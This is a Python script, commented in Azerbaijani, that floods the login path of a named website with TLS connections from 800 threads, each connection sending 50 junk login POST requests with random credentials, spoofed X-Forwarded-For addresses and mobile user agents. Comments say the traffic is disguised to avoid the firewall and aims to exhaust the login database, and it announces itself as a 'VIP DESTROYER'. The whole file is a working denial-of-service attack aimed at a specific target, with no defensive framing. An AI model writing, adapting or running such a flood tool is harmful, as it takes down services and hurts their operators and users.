import socket
import ssl
import threading
import random
import string
import time

TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 800 # Railway Paid üçün bu rəqəm daha effektivdir
# Hədəf yol - login API-ni hədəf alırıq (ən ağır hissə)
TARGET_PATH = "/#/login" 

def get_random_headers():
    # Saytı reklam trafiki kimi göstəririk ki, firewall şübhələnməsin
    ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
    forwarded_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    payload = (
        f"POST {TARGET_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: application/json, text/plain, */*\r\n"
        f"Content-Type: application/json;charset=UTF-8\r\n"
        f"X-Forwarded-For: {forwarded_ip}\r\n"
        f"Referer: https://{TARGET_HOST}/\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Length: {random.randint(100, 500)}\r\n"
        f"\r\n"
        f"{'{\"username\":\"' + ''.join(random.choices(string.ascii_lowercase, k=10)) + '\",\"password\":\"' + ''.join(random.choices(string.digits, k=8)) + '\"}'}"
    ).encode()
    return payload

def attack():
    # SSL context-i bir dəfə yarat ki, CPU yorulmasın
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # Bağlantını qur
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))
            
            # "Rapid Fire" - Bir bağlantıdan 50 ağır POST sorğusu
            for _ in range(50):
                conn.send(get_random_headers())
                # Çox qısa gözləmə (Serverin buferini doldurmaq üçün)
                time.sleep(0.01)
                
            conn.close()
        except:
            pass

def main():
    print(f"🔥 VIP DESTROYER ACTIVATED: {TARGET_HOST}")
    print("[*] Specializing in API and Login DB exhaustion...")
    
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} API Flooders deployed...")
            time.sleep(1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
